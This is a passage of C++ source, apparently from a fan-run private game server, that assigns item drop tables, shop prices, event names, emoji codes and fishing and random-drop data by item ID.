			items[i].rare_item = {  {13278,1}, { 13280,1}, { 13294,1}, { 13310,1}, { 13282,1}, { 13312,1}, { 13314,1} };
			items[i].newdropchance = 250;
		}

		if (i == 13319) {
			items[i].noob_item = { {13278,1}, { 13280,1}, { 13294,1}, { 13310,1}, { 13282,1}, { 13312,1}, { 13314,1} };
			items[i].rare_item = { {13274,1}, {13276,1}, { 13268,1}, { 13264,1}, { 13266,1}, { 13272,1} };
			items[i].newdropchance = 5;
		}




		if (i == 5090) items[i].hand_scythe_text = "`2It makes for a very tasty salad!``";
		if (i == 3088) items[i].hand_scythe_text = "`2How was there a gong in this tree!?``";
		if (i == 5198) items[i].hand_scythe_text = "`2It takes FOREVER to pick out the right grains of sand!``";
		if (i == 3086) items[i].hand_scythe_text = "`2These leaves would make a lovely crown.``";
		if (i == 3074) items[i].hand_scythe_text = "`2What's this huge leaf!?``";
		if (i == 5200) items[i].hand_scythe_text = "`2Are you feeling comfy ?``";
		if (i == 8910) items[i].hand_scythe_text = "`2Leaf Blower....``";
		if (i == 7034) items[i].hand_scythe_text = "`2What as an umbrella doing in a tree ?``";
		if (i == 11248) items[i].hand_scythe_text = "`2What's cooking? Marshmallow that's what!``";
		if (i == 10132) items[i].hand_scythe_text = "`2One with nature?``";



		if (i == 4492)  items[i].zombieprice = 25;
		if (i == 4494) items[i].zombieprice = 30;
		if (i == 4482) items[i].zombieprice = 50;
		if (i == 8980 || i == 4466 || i == 4472)items[i].zombieprice = 65;
		if (i == 4460)  items[i].zombieprice = 85;
		if (i == 4456 || i == 4458) items[i].zombieprice = 130;
		if (i == 4462)  items[i].zombieprice = 260;
		if (i == 1486) items[i].zombieprice = 300;
		if (i == 4538 || i == 4464) items[i].zombieprice = 520;
		if (i == 8950)  items[i].zombieprice = 1305;
		if (i == 4478) items[i].zombieprice = 2615;
		if (i == 9500)  items[i].zombieprice = 3000;
		if (items[i].zombieprice != 0) zombieitem.push_back(make_pair(items[i].zombieprice, i));

		if (i == 1252 || i == 8284) items[i].surgeryprice = 13000;
		if (i == 1274) items[i].surgeryprice = 1300;
		if (i == 3790 || i == 4080 || i == 4990)items[i].surgeryprice = 500;
		if (i == 4176 || i == 4322 || i == 2976)  items[i].surgeryprice = 200;
		if (i == 1506 || i == 8954) items[i].surgeryprice = 800;
		if (i == 10112 || i == 12450) items[i].surgeryprice = 2600;
		if (i == 1486) items[i].surgeryprice = 100;
		if (items[i].surgeryprice != 0) surgeryitem.push_back(make_pair(items[i].surgeryprice, i));

		if (i == 7146) items[i].wolfprice = 840;
		if (i == 3176 || i == 4344) items[i].wolfprice = 560;
		if (i == 3774)items[i].wolfprice = 280;
		if (i == 6842)  items[i].wolfprice = 240;
		if (i == 4350) items[i].wolfprice = 210;
		if (i == 4348) items[i].wolfprice = 120;
		if (i == 2984 || i == 2986 || i == 2992) items[i].wolfprice = 100;
		if (i == 1486 || i == 3538 || i == 4352) items[i].wolfprice = 20;
		if (i == 8262 || i == 8264 || i == 8268 || i == 8266) items[i].wolfprice = 1;
		if (items[i].wolfprice != 0) wolfitem.push_back(make_pair(items[i].wolfprice, i));

		if (i == 611) items[i].event_name = "Easter Week";
		if (i == 4774) items[i].event_name = "Jungle Blast";
		if (i == 1396) items[i].event_name = "What's that?";
		if (i == 942) items[i].event_name = "Desert Blast";
		if (i == 263) items[i].event_name = "Beautiful Crystal";
		if (i == 4354) items[i].event_name = "Howling At The Moon";
		if (i == 5002 || i == 5004 || i == 5006 || i == 5008) items[i].event_name = "Playful Sprite";
		if (i == 1056) items[i].event_name = "Songpyeon Event";
		if (i == 121) items[i].event_name = "Magical Seeds";
		if (i == 1636) items[i].event_name = "Awkward Friendly Unicorn";
		if (i == 2798) items[i].event_name = "Well, Well, Well";
		if (i == 2704) items[i].event_name = "Lost Gold";
		if (i == 3786) items[i].event_name = "That's Puzzling...";
		if (i == 528) items[i].event_name = "Luck of the Growish";
		if (i == 4522) items[i].event_name = "Lucky Kitty";
		if (i == 1360) items[i].event_name = "Winter Gift";
		if (i == 2992)  items[i].event_name = "Wolf Whistle";
		if (i == 10016)  items[i].event_name = "Hide And Seek";

		if (i == 611) items[i].event_total = 100;
		if (i == 2034) items[i].event_total = 15;
		if (i == 1360) items[i].event_total = 100;
		if (i == 3786) items[i].event_total = 20;
		if (i == 263 || i == 1396 || i == 4774 || i == 942 || i == 5002 || i == 1636 || i == 2704 || i == 4522)  items[i].event_total = 1;
		if (i == 1056 || i == 2798 || i == 4354) items[i].event_total = 3;
		if (i == 121) items[i].event_total = 4;
		if (i == 528 || i == 2992 || i == 10016) items[i].event_total = 5;


		// emojis


		if (i == 5804) items[i].emoji = "(oops)|ą|";
		if (i == 5806) items[i].emoji = "(sleep)|Ċ|";
		if (i == 5808) items[i].emoji = "(punch)|ċ|";
		if (i == 5810) items[i].emoji = "(bheart)|Ĕ|";
		if (i == 5812) items[i].emoji = "(cry)|ĝ|";
		if (i == 6822) items[i].emoji = "(party)|Ĩ|";
		if (i == 5770) items[i].emoji = "(wl)|ā|";
		if (i == 5772) items[i].emoji = "(grow)|Ė|";
		if (i == 5774) items[i].emoji = "(gems)|ė|";
		if (i == 5776) items[i].emoji = "(gtoken)|ę|";
		if (i == 5778) items[i].emoji = "(vend)|Ğ|";
		if (i == 6002) items[i].emoji = "(bunny)|ě|";
		if (i == 6052) items[i].emoji = "(cactus)|ğ|";
		if (i == 6272) items[i].emoji = "(peace)|ģ|";
		if (i == 6274) items[i].emoji = "(terror)|ġ|";
		if (i == 6276) items[i].emoji = "(troll)|Ġ|";
		if (i == 7232) items[i].emoji = "(halo)|Į|";
		if (i == 7234) items[i].emoji = "(nuke)|ĭ|";
		if (i == 6122) items[i].emoji = "(pine)|Ĥ|";
		if (i == 6672) items[i].emoji = "(football)|ĥ|";
		if (i == 6322) items[i].emoji = "(fireworks)|Ħ|";
		if (i == 7062) items[i].emoji = "(song)|ī|";
		if (i == 7130) items[i].emoji = "(ghost)|Ĭ|";
		if (i == 6278) items[i].emoji = "(evil)|Ģ|";
		if (i == 6824) items[i].emoji = "(pizza)|ĩ|";
		if (i == 6744) items[i].emoji = "(alien)|ħ|";
		if (i == 6894) items[i].emoji = "(clap)|Ī|";
		if (i == 7370) items[i].emoji = "(turkey)|į|";
		if (i == 7474) items[i].emoji = "(gift)|İ|";
		if (i == 7656) items[i].emoji = "(cake)|ı|";
		if (i == 7684) items[i].emoji = "(heartarrow)|Ĳ|";
		if (i == 7932) items[i].emoji = "(shamrock)|Ĵ|";
		if (i == 8028) items[i].emoji = "(grin)|ĵ|";
		if (i == 8416) items[i].emoji = "(ill)|Ķ|";
		if (i == 10114) items[i].emoji = "(eyes)|ķ|";
		if (i == 10116) items[i].emoji = "(weary)|ĸ|";
		if (i == 7698) items[i].emoji = "(lucky)|ĳ|";

		if (i == 12542) items[i].emoji = "(plead)|Ľ|";
		if (i == 12544) items[i].emoji = "(moyai)|ļ|";

		//locke shop
		if (i == 5178 || i == 1988 || i == 2478 || i == 2724 || i == 1632 || i == 4588 || i == 866 || i == 3240)  items[i].gtwl = 1;
		if (i == 4722 || i == 10000 || i == 4604)  items[i].gtwl = 3;
		if (i == 10016)  items[i].gtwl = 5;
		if (i == 2978|| i == 8878 || i == 10836 || i == 10838 || i == 12480 || i == 12482 || i == 12484 || i == 1220 || i == 2966 || i == 3684)  items[i].gtwl = 10;
		if (i == 3560 )  items[i].gtwl = 20;
		if (i == 6288 || i == 4322 || i == 3172 || i == 1636)  items[i].gtwl = 25;
		if (i == 11400 || i == 5202)   items[i].gtwl = 30;
		if (i == 2480 || i == 6140 || i == 2476 || i == 3104 || i == 6290 || i == 12044 || i == 3798)  items[i].gtwl = 50;
		if (i == 2754)  items[i].gtwl = 70;
		if (i == 3894)  items[i].gtwl = 75;
		if (i == 8892 || i == 8194 || i == 3394)  items[i].gtwl = 80;
		if (i == 3616 || i == 4516 || i == 1830 || i == 2720 || i == 2452 || i == 12046 || i == 10328 || i == 9928)  items[i].gtwl = 100;
		if (i == 11156)  items[i].gtwl = 150;
		if ( i == 4986 || i == 7190)  items[i].gtwl = 200;
		if (i == 5022 || i == 5738 || i == 2702)  items[i].gtwl = 300;
		if (i == 10166 || i == 5088 || i == 4988 || i == 6294)  items[i].gtwl = 350; //iotm
		if (i == 5206 || i == 3300 || i == 10396)  items[i].gtwl = 400;
		//if (i == 9818 || i == 9820 || i == 9822 || i == 9824)  items[i].gtwl = 450;
		if (i == 10246)   items[i].gtwl = 450;
		if (i == 3114 || i == 8024 || i == 8026 || i == 7166 || i == 6144 || i == 4972 || i == 4970 || i == 5264 || i == 2558)  items[i].gtwl = 500;
		if (i == 2284 || i == 8304)  items[i].gtwl = 600;
		if (i == 11050)  items[i].gtwl = 800;
		if (i == 11664 || i == 8834 || i == 4948 || i == 5260 || i == 12684 || i == 5086 || i == 1486)  items[i].gtwl = 1000;
		if (i == 5174) items[i].gtwl = 1100;
		if (i == 5160 || i == 1804) items[i].gtwl = 1500;
		if (i == 5194) items[i].gtwl = 1900;
		if (i == 12646 || i == 12648 || i == 12650) items[i].gtwl = 2000;
		if (i == 5958 || i == 13116) items[i].gtwl = 2500;
		if (i == 8816 || i == 12996)  items[i].gtwl = 3000;
		if (i == 10358)  items[i].gtwl = 4000;
		if (i == 4956 || i == 12640 || i == 2072 || i == 6142)  items[i].gtwl = 5000;
		if (i == 5156) items[i].gtwl = 6400;
		if (i == 5154) items[i].gtwl = 6500;
		if (i == 2450 || i == 12392 || i == 9844)  items[i].gtwl = 10000;
		if (i == 5176) items[i].gtwl = 10300;
		if (i == 7782) items[i].gtwl = 13000;
		if (server_port == 27010) items[i].gtwl *= 1000;
		if (items[i].gtwl != 0) {
			items[i].gtwl *= 1.1;
			lockeitem.push_back(make_pair(items[i].gtwl, i));
		}



		// untradealbe shop
		if (i == 6866 || i == 6896 || i == 6898 || i == 6900 || i == 6902 || i == 6904 || i == 7020) items[i].u_gtwl = 500;
		if (i == 6868 || i == 10500 || i == 11240 || i == 10720) items[i].u_gtwl = 1000;
		if (i == 6870) items[i].u_gtwl = 1500;
		if (i == 6872 || i == 10694 || i == 8620 || i == 10714 || i == 10890 || i == 11536) items[i].u_gtwl = 2500;
		if (i == 7976 || i == 9470 || i == 8030 || i == 11120) items[i].u_gtwl = 3000;
		if (i == 8308) items[i].u_gtwl = 4000;
		if (i == 7670) items[i].u_gtwl = 4500;
		if (i == 6874 || i == 8032) items[i].u_gtwl = 5000;
		if (i == 6876 || i == 1496) items[i].u_gtwl = 7500;
		if (i == 6878 || i == 8306 || i == 9410) items[i].u_gtwl = 10000;
		if (i == 9006) items[i].u_gtwl = 12500;
		if (i == 7586) items[i].u_gtwl = 15000;
		if (items[i].u_gtwl != 0) {
			items[i].u_gtwl *= 1.3;
			untradeitem.push_back(make_pair(items[i].u_gtwl, i));
		}

		//opc shop
		if (i == 9988 || i == 9990 || i == 9992 || i == 9994 || i == 13468) items[i].oprc = 1;
		if (i == 13034 ) items[i].oprc = 2;
		if (i == 1636 || i == 1632 || i == 928 || i == 872 || i == 1368 || i == 9924 || i == 9936 || i == 10016 || i == 6916 || i == 10360) items[i].oprc = 5;
		if (i== 9872 || i == 6212 || i == 10000 || i == 6912 || i == 2992) items[i].oprc = 10;
		if (i == 4354 || i == 3044 || i == 3172)  items[i].oprc = 15;
		if (i == 12392 || i == 3394 || i == 9926)   items[i].oprc = 20;
		if (i == 11400 || i == 5402 || i == 13472)  items[i].oprc = 25;
		if (i == 1052) items[i].oprc = 30;

		// baller set
		if (i == 13474 || i == 13476 || i == 13478 || i == 13480 || i == 13482 || i == 13484) items[i].oprc = 35;
		if (i == 9928 || i == 2480 || i == 1486 || i == 5196 || i == 4582 || i == 12906 || i == 10354 || i == 10356 || i == 8908 || i == 5418)  items[i].oprc = 50;
		if (i == 9882) items[i].oprc = 60;
		if (i == 13574)items[i].oprc = 80;
		if (i == 12838) items[i].oprc = 90;
		if (i == 12268 || i == 13380 || i == 13026)  items[i].oprc = 95;
		if (i == 12408 || i == 12902 || i == 13002 || i == 7152 || i == 9814) items[i].oprc = 100;
		if (i == 12420 || i == 9780 || i == 9944 || i == 13382 || i == 7216 || i == 10390 || i == 9168) items[i].oprc = 150;
		if (i == 6860 || i == 13376 || i == 2558)  items[i].oprc = 170;

		if (i == 278 || i == 8848)  items[i].oprc = 180;
		if (i == 10328 || i == 12872 || i == 9940 || i == 9942 || i == 9998 || i == 13236 || i == 13238 || i == 13330 || i == 13358 || i == 4360)  items[i].oprc = 200;
		if (i == 12658)  items[i].oprc = 220;
		if (i == 12240 || i == 10352 || i == 4170) items[i].oprc = 225;
		if (i == 12990) items[i].oprc = 240;
		if (i == 12308 || i == 12834 || i == 13046 || i == 13044 || i == 10132 || i == 10104 || i == 12462 || i == 12458 || i == 13230)  items[i].oprc = 250;
		if (i == 13120 || i == 13124 || i == 6274 || i == 10114 || i == 5804 || i == 5812 || i == 8416 || i == 13234 || i == 4556 || i == 9420 || i == 11714 || i == 4328)  items[i].oprc = 300;
		if (i == 13128 || i == 13232 || i == 13420 || i == 8516) items[i].oprc = 350;
		if (i == 12996 || i == 1836)  items[i].oprc = 360;
		if (i == 12836 || i == 2418 || i == 12874 || i == 13198)  items[i].oprc = 380;
		if ( i == 12646 || i == 12648 || i == 12650 || i == 12992 || i == 12456 || i == 4330)  items[i].oprc = 400;
		if (i == 12062 || i == 12644) items[i].oprc = 420;
		if (i == 9780 || i == 11168 || i == 13426 || i == 12600) items[i].oprc = 450;
		if (i == 12430 || i == 12848 || i == 13042 || i == 12186 || i == 3462 || i == 9716 || i == 11152 || i == 9758 || i == 13126 || i == 732) items[i].oprc = 500;
		if (i == 13422) items[i].oprc = 550;
		if (i == 736 || i == 4626 || i == 13118 || i == 6276 || i == 13330 || i == 13424 || i == 13370) items[i].oprc = 600;
		if (i == 13332 || i == 9410)items[i].oprc = 650;
		if (i == 12846 || i == 11120 || i == 9058) items[i].oprc = 700;
		if (i == 9496 || i == 9032 || i == 4208) items[i].oprc = 750;
		if (i == 9768 || i == 792 || i == 1442 || i == 13116 || i == 13140) items[i].oprc = 800;
		if (i == 4956 || i == 13068 || i == 2278 || i == 10796 || i == 1787)  items[i].oprc = 1000;
		if (i == 1228) items[i].oprc = 1150;
		if (i == 1496 || i == 3416)items[i].oprc = 1200;
		if (i == 13134) items[i].oprc = 1300;
		if (i == 7960 || i == 9384 || i == 9386) items[i].oprc = 1333;
		if (i == 12540 || i == 12284 || i == 9250  || i == 9930 || i == 9932 || i == 9934 || i == 13050) items[i].oprc = 1500;
		if (i == 7102) items[i].oprc = 1850;
		if (i == 6950 || i == 6952 || i == 5188 || i == 9212 || i == 5134 || i == 5152 || i == 5170) items[i].oprc = 2000;
		if (i == 12406)  items[i].oprc = 2100;
		if (i == 2072 || i == 6954) items[i].oprc = 2500;
		if (i == 12342 || i == 9856 || i == 6016 || i == 6782 || i == 8306) items[i].oprc = 3000;
		if (i == 6954) items[i].oprc = 4000;
		if (i == 9166) items[i].oprc = 5000;
		if (i== 1790)items[i].oprc = 9500;
		if (i == 10684) items[i].oprc = 99999;

		//
		if (items[i].oprc != 0) opc_item.push_back(make_pair(items[i].oprc, i));
		//premium shop 
		if (i == 3724)  items[i].pwl = 1;
		if (i == 9168 || i == 10228 || i == 12598 || i == 12900 || i == 12940)  items[i].pwl = 3;
		if (i == 9350 || i == 10838 || i == 10836 || i == 12566 || i == 10158 || i == 1220)  items[i].pwl = 5;
		if (i == 5138 || i == 11756 || i == 3172 || i == 12678 || i == 611)  items[i].pwl = 10;
		if (i == 1584 || i == 11860)  items[i].pwl = 25;
		if (i == 10826 || i == 5482 || i == 5140 || i == 11758 || i == 8522 || i == 13550)  items[i].pwl = 50;
		if (i == 6334 || i == 10922 || i == 11902 || i == 5142 || i == 1680 || i == 11038 || i == 12568 || i == 10386)  items[i].pwl = 100;
		if (i == 11550 || i == 10004 || i == 10328 || i == 8196 || i == 12986 || i == 7672 || i == 2558)  items[i].pwl = 150;
		if (i == 7762 || i == 8496 || i == 11906 || i == 12178 || i == 12654 || i == 12834 || i == 12920|| i == 12838 || i == 11586 || i == 11550 || i == 1796 || i == 10756)  items[i].pwl = 200;
		if (i == 12014 || i == 12016 || i == 12018 || i == 12020 || i == 7650 || i == 11818 || i == 11908 || i == 12206 || i == 12642 || i == 12768 || i == 9600 || i == 10396)items[i].pwl = 300;
		if (i == 12646 || i == 12648 || i == 12650 || i == 11464 || i == 11466 || i == 11470 || i == 9470 || i== 12600 || i == 2722 || i == 12876|| i == 11882 || i == 6948 || i == 1836 || i == 11562 || i == 12014 || i == 12016 || i == 12018 || i == 12020 || i == 12374 || i == 12422 || i == 12424 || i == 12426 || i == 12428)  items[i].pwl = 500;
		if (i == 11884 || i == 9768 || i == 12644 || i == 12638|| i == 12640 || i == 12632 || i == 12628 || i == 12836 || i == 11476 || i == 12872 || i == 12878 || i == 12890)  items[i].pwl = 750;
		if (i == 3134 || i == 1824 || i == 11750 || i == 5188 || i == 9384 || i == 10412 || i == 3138 || i == 12190 || i == 12346 || i == 12430 || i == 12308 || i == 12300 || i == 12306 || i == 12874)  items[i].pwl = 1000;
		if (i == 9386 || i == 11752 || i == 6950 || i == 6952 || i == 9114 || i == 12880 || i == 13500||  i == 13140 || i == 12836)  items[i].pwl = 1500;
		if (i == 8308 || i == 6312 || i == 5136 || i == 11008 || i == 12354 || i == 10536 || i == 12924 || i == 5980 || i == 11748 || i == 10674 || i == 12958 || i == 8304)  items[i].pwl = 2000;
		if (i == 2450 || i == 9532 || i == 278 || i == 12540 || i == 12356 || i == 13024)  items[i].pwl = 2500;
		if (i == 3040 || i == 572 || i == 1442 || i == 2072 || i == 6950 || i == 6952 || i == 2408 || i == 12892 || i == 13026)  items[i].pwl = 3000;
		if (i == 6142 || i == 9496 || i == 9166 || i == 1484 || i == 936 || i == 8308 || i == 4290 || i == 3416 || i == 4282 || i == 2420 || i == 8620 || i == 938 || i == 940 || i == 8030 || i == 8032 || i == 736 || i == 4340 || i == 4518)  items[i].pwl = 5000;
		if (i == 5152 || i == 9730 || i == 12856 || i == 12858)  items[i].pwl = 6500;
		if (i == 12242)  items[i].pwl = 6800;
		if (i == 11462 || i == 1787 || i == 4802)  items[i].pwl = 7000;
		if (i == 9326 || i == 12406)  items[i].pwl = 7500;
		if (i == 6954) items[i].pwl = 8500;
		if (i == 11118 || i == 1789)  items[i].pwl = 12500;
		if (i == 9546)  items[i].pwl = 15000;
		if (i == 9850)  items[i].pwl = 19000;
		if (i == 7188)items[i].pwl = 20000;
		if (i == 1790)items[i].pwl = 50000;
		if (i == 9772)  items[i].pwl = 90000;
		if (i == 10684) items[i].oprc = 99999;


		if (i == 9266)  items[i].pwl = 5;
		if (i == 6856)  items[i].pwl = 25;
		if (i == 6858)  items[i].pwl = 100;
		if (i == 6860)  items[i].pwl = 400;
		if (i == 8188)  items[i].pwl = 1500;
		items[i].pwl = items[i].pwl * 1.3;

		if (items[i].pwl != 0) {
			if (domain != "https://reugtps.ddns.net/") items[i].pwl /= 3;
			premium_item.push_back(make_pair(items[i].pwl, i));
		}

		if (i == 6286 || i == 4516 || i == 8878 || i == 10584) items[i].box_size = 20;
		if (i == 6288) items[i].box_size = 40;
		if (i == 6290) items[i].box_size = 90;
		if (i == 9894) items[i].box_size = 120;
		// (wl)|ā|1&(yes)|Ă|1&(no)|ă|1&(love)|Ą|1&(oops)|ą|1&(shy)|Ć|1&(wink)|ć|1&(tongue)|Ĉ|1&(agree)|ĉ|1&(sleep)|Ċ|1&(punch)|ċ|1&(music)|Č|1&(build)|č|1&(megaphone)|Ď|1&(sigh)|ď|1&(mad)|Đ|1&(wow)|đ|1&(dance)|Ē|1&(see-no-evil)|ē|1&(bheart)|Ĕ|1&(heart)|ĕ|1&(grow)|Ė|1&(gems)|ė|1&(kiss)|Ę|1&(gtoken)|ę|1&(lol)|Ě|1&(smile)|Ā|1&(cool)|Ĝ|1&(cry)|ĝ|1&(vend)|Ğ|1&(bunny)|ě|1&(cactus)|ğ|1&(pine)|Ĥ|1&(peace)|ģ|1&(terror)|ġ|1&(troll)|Ġ|1&(evil)|Ģ|1&(fireworks)|Ħ|1&(football)|ĥ|1&(alien)|ħ|1&(party)|Ĩ|1&(pizza)|ĩ|1&(clap)|Ī|1&(song)|ī|1&(ghost)|Ĭ|1&(nuke)|ĭ|1&(halo)|Į|1&(turkey)|į|1&(gift)|İ|1&(cake)|ı|1&(heartarrow)|Ĳ|1&(lucky)|ĳ|1&(shamrock)|Ĵ|1&(grin)|ĵ|1&(ill)|Ķ|1&(eyes)|ķ|1&(weary)|ĸ|1&(moyai)|ļ|1&(plead)|Ľ|1&
		if (i == 3000) items[i].fish_max_lb = 15;
		if (i == 3026) items[i].fish_max_lb = 30;
		if (i == 3030 || i == 3458 || i == 5450) items[i].fish_max_lb = 50;
		if (i == 5542 || i == 5548) items[i].fish_max_lb = 60;
		if (i == 3038) items[i].fish_max_lb = 70;
		if (i == 3032) items[i].fish_max_lb = 90;
		if (i == 8606 || i == 3452) items[i].fish_max_lb = 100;
		if (i == 3034 || i == 5552 || i == 3222) items[i].fish_max_lb = 120;
		if (i == 3450 || i == 3224 || i == 3434 || i == 3436 || i == 3550 || i == 3620 || i == 3746 || i == 5100 || i == 10264 || i == 3440 || i == 3820 || i == 3438 || i == 3544) items[i].fish_max_lb = 150;
		if (i == 3036 || i == 3814 || i == 5538) items[i].fish_max_lb = 160;
		if (i == 3226) items[i].fish_max_lb = 180;
		if (i == 5580 || i == 5574) items[i].fish_max_lb = 190;
		if (i == 4958 || i == 3024 || i == 7744 || i == 3454 || i == 3460 || i == 3094 || i == 3092 || i == 3096 || i == 3220 || i == 5448) items[i].fish_max_lb = 200;
		if (i == 2914) items[i].randomitem = { 846,344,8964,3000,3000,3034, 3034,3038, 3038,3028,3012,6080 };
		if (i == 3012) items[i].randomitem = { 3000,3000,3030, 3030,3038, 3038,3036, 3036,846,444,8966,344,3028,3022,3014,3000,3000,3030, 3030,3038, 3038,3036, 3036,846,444,8966,344,3028,3022,3014,11166,6080 };
		if (i == 3014) items[i].randomitem = { 3030, 3030, 3026, 3026,3038, 3038, 3000,3000 , 3032, 3032 ,344 ,444 ,846 ,8966 ,8964 ,1520 ,1542 ,3016 ,10786, 6080 };
		if (i == 3016) items[i].randomitem = { 846,3026, 3026,3038, 3038,3032, 3032,3036, 3036,444,1522,8256,8964,3184,1542,3018,10786, 846,3026, 3026,3038, 3038,3032, 3032,3036, 3036,444,1522,8256,8964,3184,1542,3018,10786, 10566, 12448, 6080 };
		if (i == 3018) items[i].randomitem = { 6080, 5636, 846, 3036, 3036, 3034, 3034, 3032, 3032, 3024, 846, 3036, 3036, 3034, 3034, 3032, 3032, 3024, 4958, 1520, 8966, 344, 1522, 3022, 3810, 3448, 3008, 3184, 3020, 3812, 12236, 5612, 12448 , 846, 3036, 3036, 3034, 3034, 3032, 3032, 3024, 846, 3036, 3036, 3034, 3034, 3032, 3032, 3024, 4958, 1520, 8966, 344, 1522, 3022, 3810, 3448, 3008, 3184, 3020, 3812, 12236, 5612, 12448 };
		if (i == 3020) items[i].randomitem = { 5636, 1542,3022,1520,1522,3028,3038, 3038,3026, 3026,3030,3036, 3036, 3030,7744,3032, 3032,3000,3000,3034, 3034,4958,3024, 1542,3022,1520,1522,3028,3038, 3038,3026, 3026,3030,3036, 3036, 3030,7744,3032, 3032,3000,3000,3034, 3034,4958,3024, 3814 };
		if (i == 3098) items[i].randomitem = { 6080, 3096,3094,3092,1208,1238,1992,1200,1202,1198,3096,3094,3092,1208,1238,1992,1200,1202,1198,1220 };
		if (i == 3218) items[i].randomitem = { 6080, 3204,1360,3228,3222,3224,5450,5448,3220,3226,3020 };
		if (i == 3432) items[i].randomitem = { 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 9386, 9384, 732, 9902, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240, 6080, 3544, 3820, 3434, 3438, 3436, 3440, 3550, 3620, 3746, 10264, 5100, 12228, 12230 , 12234 , 12240 };
		if (i == 4246) items[i].randomitem = { 3096,3094,1208,1992,1200,1198 };
		if (i == 4248) items[i].randomitem = { 3096,3094,3092,1208,1238,1992,1200,1202,1198,3096,3094,3092,1208,1238,1992,1200,1202,1198,1220 };
		if (i == 5526) items[i].randomitem = { 3584,8254,5542,5538,5620,5622,5612,5526,5580,3020,11734 };
		if (i == 5528) items[i].randomitem = { 5636, 3584,5574,8968,5552,5548,5618,5624,5602,5528,5614,8252,11052,5616,3020, 12238, 12232, 3584,5574,8968,5552,5548,5618,5624,5602,5528,5614,8252,11052,5616,3020, 12238, 12232 };
		if (i == 11406) items[i].randomitem = { 11446, 11444, 11424, 11450, 11420, 11434, 11418, 11414, 11416, 11428, 11430 };
		if (i == 962 || i == 16 || i == 3472 || i == 954 || i == 880 || i == 188 || i == 190 || i == 22) {
			items[i].randomitem.push_back(882);
			items[i].chance = 1500;
		}
		else if (i == 866) {
			items[i].randomitem.push_back(870);
			items[i].chance = 5000;
		}
		else if (i == 872) {
			items[i].randomitem.push_back(876);
			items[i].chance = 5000;
		}
		else if (i == 440 || i == 1344) {
			items[i].randomitem.push_back(2800);
			items[i].chance = 5000;
		}
		else if (i == 166) {
			items[i].randomitem.push_back(1190);
			items[i].chance = 3000;
		}
		else if (i == 280) {
			items[i].randomitem.push_back(10068);
			items[i].chance = 2000;
		}
		else if (i == 326) {
			items[i].randomitem.push_back(878);
			items[i].chance = 5000;
		}
		else if (i == 1044) {
			items[i].randomitem.push_back(10070);
			items[i].chance = 5000;
		}
		else if (i == 1004) {
			items[i].randomitem.push_back(1104);
			items[i].chance = 100;
		}
		else if (i == 192) {
			items[i].randomitem.push_back(1004);
			items[i].chance = 100;
		}
		else if (items[i].blockType == BACKGROUND && items[i].rarity > 11) {
			items[i].randomitem.insert(items[i].randomitem.end(), { 2988 ,2990 });
			items[i].chance = 75;
		}
		else if (i == 3258 || i == 3262 || i == 3264 || i == 3266 || i == 3268 || i == 3270 || i == 3280 || i == 3282 || i == 3284 || i == 3286) {
			items[i].randomitem.push_back(3310);
			items[i].chance = 1000;
		}
		else if (i == 4762 || i == 262 || i == 826 || i == 5270 || i == 828 || i == 2812 || i == 3606 || i == 3424) {
			items[i].randomitem.push_back(5282);
			items[i].chance = 10;
		}
		else if (i == 3782) {
			items[i].randomitem.push_back(3784);
			items[i].chance = 25;
		}
		else if (i == 100) {
			items[i].randomitem.push_back(2792);
			items[i].chance = 25;
		}
		else if (i == 4702) {
			items[i].randomitem.push_back(4794);
			items[i].chance = 25;
		}
		else if (i == 324 || i == 322 || i == 786) {
			items[i].randomitem.push_back(1354);
			items[i].chance = 2000;
		}
		else if (i == 2708) {
			items[i].randomitem.push_back(2710);
			items[i].chance = 25;
		}
		else if (i == 2710) {
